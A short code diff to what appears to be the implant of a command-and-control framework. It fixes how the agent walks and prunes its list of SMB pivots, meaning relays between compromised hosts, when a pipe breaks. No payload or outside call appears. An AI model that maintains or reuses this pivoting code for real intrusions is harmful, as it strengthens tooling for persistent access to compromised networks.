@@ -139,7 +139,7 @@ PPIVOT_DATA PivotGet( DWORD AgentID )
 
 BOOL PivotRemove( DWORD AgentId )
 {
-    PRINTF( "Remove pivot %x", AgentId )
+    PRINTF( "Remove pivot %x\n", AgentId )
 
     PPIVOT_DATA TempList  = Instance.SmbPivots;
     PPIVOT_DATA PivotData = PivotGet( AgentId );
@@ -291,7 +291,8 @@ VOID PivotPush()
                         PUTS( "ERROR_BROKEN_PIPE. Remove pivot" )
 
                         DWORD DemonID = TempList->DemonID;
-                        BOOL  Removed = PivotRemove( TempList->DemonID );
+                        TempList      = TempList->Next;
+                        BOOL  Removed = PivotRemove( DemonID );
 
                         PRINTF( "Pivot removed: %s\n", Removed ? "TRUE" : "FALSE" )
 
@@ -302,7 +303,7 @@ VOID PivotPush()
                         PackageAddInt32( Package, DemonID );
                         PackageTransmit( Package, NULL, NULL );
 
-                        break;
+                        continue;
                     }
 
                     CALLBACK_GETLASTERROR
@@ -314,7 +315,8 @@ VOID PivotPush()
         }
 
         // select the next pivot
-        TempList = TempList->Next;
+        if ( TempList )
+            TempList = TempList->Next;
 
     } while ( TRUE );
 }
